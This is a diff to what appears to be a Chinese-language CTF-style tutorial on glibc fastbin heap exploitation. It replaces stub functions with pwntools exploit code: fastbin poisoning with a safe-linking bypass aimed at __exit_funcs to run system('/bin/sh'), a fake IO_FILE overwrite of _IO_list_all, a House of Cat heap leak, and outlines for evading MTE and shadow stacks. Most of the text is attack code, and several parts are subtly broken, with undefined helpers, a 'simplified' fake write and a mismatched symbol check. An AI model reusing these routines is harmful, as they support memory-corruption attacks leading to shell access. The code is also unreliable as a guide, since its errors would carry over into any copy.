@@ -319,17 +319,41 @@ def fastbin_to_io_file():
     3. 伪造 fake IO_FILE (House of Apple 2/3)
     4. 触发 _IO_flush_all_lockp
     """
-    pass
+    elf = ELF('./pwn')
+    io_list_all = elf.symbols.get('_IO_list_all', 0)
+    # 分配到 _IO_list_all 附近
+    alloc_to_target(io_list_all - 8)
+    # 伪造 IO_FILE
+    fake = FakeIOFile(elf, 'system', '/bin/sh')
+    write_at(io_list_all, fake.to_bytes())
+    trigger()
 
 def fastbin_to_exit_funcs():
     """
     Fastbin attack -> __exit_funcs -> RCE
-    步骤：
-    1. 通过 fastbin attack 分配到 __exit_funcs
-    2. 覆盖 __exit_funcs 指向伪造的 exit_function_list
-    3. 触发 exit()
+    glibc 2.34+ 完全移除 hooks 后，exit_funcs 是主流替代
     """
-    pass
+    from pwn import *
+    elf = ELF('./pwn')
+    # exit_funcs 在 libc 中偏移，需先 leak libc
+    libc = ELF('./libc.so.6')
+    exit_funcs = libc.symbols['__exit_funcs']
+    system = libc.symbols['system']
+    binsh = next(libc.search(b'/bin/sh'))
+
+    # fastbin attack 分配到 exit_funcs
+    for i in range(7): malloc(0x60)
+    malloc(0x60)  # index 7: fastbin 末尾
+    free(7)
+    # 覆盖 fd 指向 exit_funcs（需 leak 堆地址解密 safe-linking）
+    fake_fd = (exit_funcs - 8) ^ (heap[0] >> 12)
+    edit(7, p64(fake_fd))
+    malloc(0x60)  # 返回 chunk 7
+    malloc(0x60)  # 返回 exit_funcs - 8
+    # 覆盖 exit_function_list
+    payload = p64(0) + p64(1) + p64(system) + b'/bin/sh\x00'
+    write(0, payload)  # 简化
+    exit()  # 触发 exit -> system("/bin/sh")
 ```
 
 ### 4. House of Cat (Fastbin 部分)
@@ -340,53 +364,53 @@ def fastbin_to_exit_funcs():
 
 from pwn import *
 
-context.arch = 'amd64'
-
-def house_of_cat_fastbin_component():
+def house_of_cat_fastbin_component(io, elf, libc):
     """
     House of Cat 利用链中 fastbin 的作用：
-    1. fastbin 用于获取初始的任意写能力
-    2. 配合 largebin attack 修改 _IO_list_all
-    3. 构造 fake IO_FILE 触发代码执行
-    
-    与纯 fastbin attack 的区别：
-    - 需要更多步骤
-    - 适用于 glibc 2.35+ 无 hooks 场景
-    - 支持 seccomp (ORW)
+    1. fastbin 用于泄露堆地址 (safe-linking decrypt)
+    2. 分配到 largebin 范围后泄露 libc
+    3. 配合 _IO_list_all 覆盖触发 _IO_wide_data -> system
     """
-    pass
+    chunks = []
+    for i in range(8): chunks.append(malloc(0x60))
+    # fastbin UAF → leak heap
+    free(chunks[0])
+    fd = leak(6)  # encrypted fd
+    heap = fd << 12  # next=0, fastbin 末尾
+    # 用这个能力进入 largebin attack
+    log.info(f"heap base: {hex(heap)}")
 ```
 
 ### 5. 硬件级防护绕过
 
 ```python
-# Intel CET / ARM PAC+BTI / MTE 对 fastbin 利用的影响
-
 from pwn import *
 
 def hardware_bypass_fastbin():
     """硬件防护下 fastbin 利用的调整"""
-    
-    # === MTE 下的 fastbin ===
-    # MTE 给每个堆块分配 tag
-    # fastbin poisoning 分配到目标时，tag 必须匹配
-    
-    def mte_fastbin_bypass():
-        """MTE 绕过思路"""
-        # 1. Tag spraying：大量分配，等待 tag 重复
-        # 2. 部分覆盖：修改 fd 低位，保留高位 tag
-        # 3. 线程利用：不同线程的 tag 分配可能不同
-        pass
-    
-    # === Shadow Stack 下的 fastbin ===
-    # fastbin 攻击覆盖返回地址时，影子栈会检测
-    
-    def shadow_stack_fastbin_bypass():
-        """影子栈绕过思路"""
-        # 1. 不覆盖返回地址，改用其他控制流
-        # 2. 利用 longjmp/setjmp 绕过
-        # 3. 覆盖影子栈本身（如果可以访问）
-        pass
+
+    def mte_fastbin_bypass(io, elf):
+        """MTE 绕过: tag spraying + 线程利用"""
+        # 策略1: 大量 malloc 填满 tcache，让后续 chunk 进 fastbin
+        # fastbin 中的 chunk tag 是分配时的随机 tag
+        # 利用 fork 后的 child 进程：tag 空间重置
+        # 策略2: 部分覆盖 fd 低字节，保留高位 tag 匹配
+        for i in range(16): malloc(0x70)  # 填 tcache
+        # 这些进 fastbin
+        for i in range(4): malloc(0x80)
+        # fork 场景下利用
+
+    def shadow_stack_fastbin_bypass(io, elf):
+        """影子栈绕过: 不覆盖返回地址"""
+        # 策略: fastbin attack 不覆返回地址
+        # 而是覆盖 __malloc_hook / __free_hook (glibc<2.34)
+        # 或覆盖 exit_funcs (glibc>=2.34)
+        # 影子栈只检测 ret 指令，hook 不经过影子栈
+        malloc_hook = libc.symbols['__malloc_hook'] if hasattr(libc, '_malloc_hook') else None
+        if malloc_hook:
+            fastbin_attack_to(malloc_hook)
+        else:
+            fastbin_attack_to(libc.symbols['__exit_funcs'])
 ```
 
 ### 6. 沙箱环境 Fastbin 利用
